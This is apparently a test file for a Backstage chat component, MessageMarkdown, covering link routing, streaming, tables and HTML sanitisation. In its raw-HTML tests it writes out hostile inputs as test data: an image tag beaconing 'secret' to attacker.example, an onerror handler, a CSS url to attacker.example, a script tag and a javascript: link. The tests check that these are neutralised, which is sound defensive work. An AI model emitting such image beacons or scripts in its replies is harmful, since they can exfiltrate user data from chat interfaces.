import { renderInTestApp } from '@backstage/frontend-test-utils';
import { useState } from 'react';
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { newSessionExternalRouteRef } from '../../routes';
import { MessageMarkdown } from './MessageMarkdown';

describe('MessageMarkdown', () => {
  it.each([
    '/workspace/giantswarm/bumblebee-plans/plan/grill-sessions/session.md',
    '/data/workspace/plan/PRD.md',
  ])('shows session path %s without routing to a portal page', async file => {
    await renderInTestApp(<MessageMarkdown text={`[Grill log](${file})`} />);

    expect(screen.queryByRole('link', { name: 'Grill log' })).toBeNull();
    expect(screen.getByText(file)).toBeInTheDocument();
    expect(screen.getByText(/session file/)).toBeInTheDocument();
  });

  it('sets every paragraph at 14px, the size of the user’s own message', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown
        text={[
          'A plain paragraph with `code`.',
          '',
          '- a loose list item',
          '',
          '- whose text is a paragraph',
          '',
          '> A quoted paragraph.',
        ].join('\n')}
      />,
    );

    const paragraphs = container.querySelectorAll('p');
    expect(paragraphs).toHaveLength(4);
    // 0.875rem, as jsdom computes it.
    paragraphs.forEach(p => expect(p).toHaveStyle({ fontSize: '14px' }));
  });

  it('keeps the elements of a reply while more of it streams in', async () => {
    function Streaming() {
      const [text, setText] = useState(
        '<details><summary>Plan</summary>\n\nStep one.\n\n</details>',
      );
      return (
        <>
          <button onClick={() => setText(t => `${t}\n\nMore text.`)}>
            Stream
          </button>
          <MessageMarkdown text={text} />
        </>
      );
    }
    await renderInTestApp(<Streaming />);

    const details = screen.getByText('Plan').closest('details')!;
    await userEvent.click(screen.getByText('Plan'));
    expect(details).toHaveAttribute('open');

    await userEvent.click(screen.getByRole('button', { name: 'Stream' }));

    expect(await screen.findByText('More text.')).toBeInTheDocument();
    // The same element, still open: not remounted by the new chunk.
    expect(screen.getByText('Plan').closest('details')).toBe(details);
    expect(details).toHaveAttribute('open');
  });

  it('keeps whole words in table cells, so a wide table scrolls instead', async () => {
    await renderInTestApp(
      <MessageMarkdown
        text={
          '| kubernetes_namespace | status |\n| - | - |\n| giantswarm | ok |'
        }
      />,
    );

    expect(
      screen.getByRole('columnheader', { name: 'kubernetes_namespace' }),
    ).toHaveStyle({ overflowWrap: 'normal' });
    expect(screen.getByRole('cell', { name: 'giantswarm' })).toHaveStyle({
      overflowWrap: 'normal',
    });
  });

  it('starts a session in this tab from a new-session link', async () => {
    await renderInTestApp(
      <MessageMarkdown text="[Start a session with General Assistant](/?agent=golem%2Fkagent%2Fdefault-agent#prompt=Watch%20backups)" />,
      { mountedRoutes: { '/': newSessionExternalRouteRef } },
    );

    const link = screen.getByRole('link', {
      name: 'Start a session with General Assistant',
    });
    expect(link).toHaveAttribute(
      'href',
      '/?agent=golem%2Fkagent%2Fdefault-agent#prompt=Watch%20backups',
    );
    expect(link).not.toHaveAttribute('target');
  });

  it('opens any other portal page in a new tab, query and fragment kept', async () => {
    await renderInTestApp(
      <MessageMarkdown text="[Sessions](/sessions?state=open#top)" />,
      { mountedRoutes: { '/': newSessionExternalRouteRef } },
    );

    const link = screen.getByRole('link', { name: 'Sessions' });
    expect(link).toHaveAttribute('href', '/sessions?state=open#top');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('keeps a same-origin link with a doubled slash in the portal', async () => {
    await renderInTestApp(
      <MessageMarkdown
        text={`[Away](${window.location.origin}//evil.example/x?a=1)`}
      />,
    );

    expect(screen.getByRole('link', { name: 'Away' })).toHaveAttribute(
      'href',
      '/evil.example/x?a=1',
    );
  });

  it('drops a javascript: link', async () => {
    await renderInTestApp(
      <MessageMarkdown text="[Run](javascript:alert(1))" />,
    );

    expect(screen.queryByRole('link', { name: 'Run' })).toBeNull();
  });

  it('keeps a fragment link on this page', async () => {
    await renderInTestApp(<MessageMarkdown text="[Details](#details)" />);

    const link = screen.getByRole('link', { name: 'Details' });
    // The sanitiser prefixes fragments as it prefixes the ids they point at.
    expect(link).toHaveAttribute('href', '#user-content-details');
    expect(link).not.toHaveAttribute('target');
  });

  it('lets the browser fetch a backend URL, in a new tab', async () => {
    await renderInTestApp(
      <MessageMarkdown text="[Report](/api/proxy/report.csv)" />,
    );

    const link = screen.getByRole('link', { name: /Report/ });
    expect(link).toHaveAttribute('href', '/api/proxy/report.csv');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('opens another origin in a new tab', async () => {
    await renderInTestApp(
      <MessageMarkdown text="[Docs](https://docs.giantswarm.io/)" />,
    );

    const link = screen.getByRole('link', { name: /Docs/ });
    expect(link).toHaveAttribute('href', 'https://docs.giantswarm.io/');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link.getAttribute('rel')).toContain('noopener');
  });
});

describe('MessageMarkdown raw HTML', () => {
  const loaders = 'img, picture, source, video, audio, iframe, [src], [srcset]';

  it('loads nothing from an <img> quoted out of tool output', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown
        text={
          'Tool said:\n\n<img src="https://attacker.example/pixel.png?d=secret" alt="pixel" onerror="alert(1)">\n\n<picture><source srcset="https://attacker.example/a.png"></picture>'
        }
      />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(screen.getByRole('link', { name: /Image: pixel/ })).toHaveAttribute(
      'href',
      'https://attacker.example/pixel.png?d=secret',
    );
  });

  it('renders a Markdown image as a link instead of loading it', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text="![chart](https://example.com/chart.png)" />,
    );

    expect(container.querySelector(loaders)).toBeNull();
    expect(screen.getByRole('link', { name: /Image: chart/ })).toBeVisible();
  });

  it('keeps <details> blocks', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown
        text={'<details><summary>Logs</summary>\n\nline one\n\n</details>'}
      />,
    );

    expect(container.querySelector('details > summary')).toHaveTextContent(
      'Logs',
    );
    expect(screen.getByText('line one')).toBeInTheDocument();
  });

  it('keeps the language class of a fenced code block', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text={'```yaml\na: 1\n```'} />,
    );

    expect(container.querySelector('pre > code.language-yaml')).not.toBeNull();
  });

  it('drops inline styles and scripts from raw HTML', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text='<div style="background:url(https://attacker.example/bg)">x</div><script>alert(1)</script>' />,
    );

    expect(container.querySelector('[style*="attacker"]')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
  });

  it('links a GFM footnote to its note and back', async () => {
    const { container } = await renderInTestApp(
      <MessageMarkdown text={'A claim.[^1]\n\n[^1]: The source.'} />,
    );

    const ref = container.querySelector('a[data-footnote-ref]');
    const back = container.querySelector('a[data-footnote-backref]');
    const note = ref?.getAttribute('href')?.slice(1);
    const origin = back?.getAttribute('href')?.slice(1);
    expect(note).toBe('user-content-fn-1');
    expect(container.querySelector(`[id="${note}"]`)).toHaveTextContent(
      'The source.',
    );
    expect(origin).toBe('user-content-fnref-1');
    expect(container.querySelector(`[id="${origin}"]`)).toBe(ref);
  });
});
